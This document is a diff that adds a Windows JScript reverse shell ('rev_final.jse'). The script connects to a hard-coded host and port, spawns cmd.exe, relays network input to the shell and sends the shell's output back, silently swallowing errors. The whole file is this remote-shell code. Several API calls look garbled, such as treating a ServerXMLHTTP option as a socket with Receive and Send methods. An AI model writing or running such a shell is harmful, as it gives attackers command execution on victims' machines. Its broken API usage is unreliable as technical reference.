@@ -1,0 +1,89 @@
+// rev_final.jse 
+// Fixes: hostname, dir, ping, long output, CR/LF
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+
+    try {
+        // 1. Connect via ServerXMLHTTP
+        var xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
+        xml.open("GET", "http://" + host + ":" + port + "/", false);
+        xml.setRequestHeader("User-Agent", "");
+        xml.send();
+
+        var socket = xml.getOption(4);
+        if (!socket) throw "No socket";
+
+        // 2. Spawn cmd.exe
+        var shell = new ActiveXObject("WScript.Shell");
+        var proc = shell.Exec("cmd.exe");
+
+        // 3. ADODB.Stream for output
+        var outStream = new ActiveXObject("ADODB.Stream");
+        outStream.Type = 1; outStream.Open();
+
+        // 4. Input buffer
+        var inputBuffer = "";
+
+        // 5. Main loop
+        while (true) {
+            try {
+                // --- Network → cmd ---
+                if (socket.DataAvailable > 0) {
+                    var data = socket.Receive(socket.DataAvailable);
+                    var bytes = new VBArray(data).toArray();
+                    var text = "";
+                    for (var i = 0; i < bytes.length; i++) {
+                        text += String.fromCharCode(bytes[i]);
+                    }
+                    inputBuffer += text;
+
+                    // Process line-by-line
+                    var lines = inputBuffer.split("\r\n");
+                    inputBuffer = lines.pop();  // keep incomplete line
+                    for (var j = 0; j < lines.length; j++) {
+                        if (lines[j]) {
+                            proc.StdIn.WriteLine(lines[j]);
+                        }
+                    }
+                }
+
+                // --- cmd → Network ---
+                var output = "";
+                try {
+                    while (!proc.StdOut.AtEndOfStream) {
+                        output += proc.StdOut.ReadAll();
+                    }
+                } catch(e) {}
+                try {
+                    while (!proc.StdErr.AtEndOfStream) {
+                        output += proc.StdErr.ReadAll();
+                    }
+                } catch(e) {}
+
+                if (output) {
+                    var bytes = [];
+                    for (var k = 0; k < output.length; k++) {
+                        bytes.push(output.charCodeAt(k) & 255);
+                    }
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                    outStream.Write(new VBArray(bytes).toArray());
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read());
+                }
+
+                WScript.Sleep(10);
+
+                // Exit if cmd died
+                try { proc.ExitCode; break; } catch(e) {}
+
+            } catch (e) { break; }
+        }
+    } catch (e) {
+        // silent
+    } finally {
+        try { proc.Terminate(); } catch(e) {}
+        try { socket.Close(); } catch(e) {}
+    }
+})();
